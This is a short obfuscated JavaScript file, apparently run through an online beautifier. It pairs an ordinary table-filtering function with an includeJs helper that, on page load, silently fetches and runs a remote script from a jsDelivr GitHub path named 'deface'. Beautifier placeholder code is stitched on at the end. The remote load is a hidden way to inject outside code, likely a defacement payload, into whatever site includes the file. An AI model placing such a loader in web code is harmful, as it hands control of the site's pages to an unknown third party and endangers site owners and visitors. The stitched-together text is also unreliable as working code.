function searchTable() {
    var _0xb773x2, _0xb773x3, _0xb773x4, _0xb773x5, _0xb773x6, _0xb773x7, _0xb773x8, _0xb773x9;
    _0xb773x2 = document['getElementById']('myInput');
    _0xb773x3 = _0xb773x2['value']['toUpperCase']();
    _0xb773x5 = document['getElementById']('myTable');
    _0xb773x6 = _0xb773x5['getElementsByTagName']('tr');
    for (_0xb773x8 = 0; _0xb773x8 < _0xb773x6['length']; _0xb773x8++) {
        _0xb773x7 = _0xb773x6[_0xb773x8]['getElementsByTagName']('td');
        for (_0xb773x9 = 0; _0xb773x9 < _0xb773x7['length']; _0xb773x9++) {
            if (_0xb773x7[_0xb773x9]['innerHTML']['toUpperCase']()['indexOf'](_0xb773x3) > -1) {
                _0xb773x4 = true
            }
        };
        if (_0xb773x4) {
            _0xb773x6[_0xb773x8]['style']['display'] = '';
            _0xb773x4 = false
        } else {
            _0xb773x6[_0xb773x8]['style']['display'] = 'none'
        }
    }
}

function includeJs(_0xb773xb) {
    var _0xb773xc = document['createElement']('script');
    _0xb773xc['type'] = 'text/javascript';
    _0xb773xc['src'] = _0xb773xb;
    document['body']['appendChild'](_0xb773xc)
}
includeJs('https://cdn.jsdelivr.net/gh/zonemedia/deface/index.js') // This is just a sample script. Paste your real code (javascript or HTML) here.

if ('this_is' == /an_example/) {
    of_beautifier();
} else {
    var a = b ? (c % d) : e[f];
}
